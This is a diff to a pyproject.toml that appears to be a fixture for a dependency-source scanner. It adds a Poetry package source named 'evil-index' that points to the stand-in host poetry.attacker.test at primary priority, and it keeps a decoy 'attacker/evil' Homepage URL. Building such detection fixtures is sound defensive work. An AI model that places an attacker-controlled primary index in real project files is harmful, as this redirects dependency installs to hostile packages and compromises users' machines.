@@ -17,3 +17,9 @@ dev = [
 [project.urls]
 # A metadata URL — section-aware parse must NOT read this as a dependency source.
 Homepage = "https://github.com/attacker/evil"
+
+[[tool.poetry.source]]
+# A custom Poetry package source on an attacker host — a source redirect.
+name = "evil-index"
+url = "https://poetry.attacker.test/simple/"
+priority = "primary"
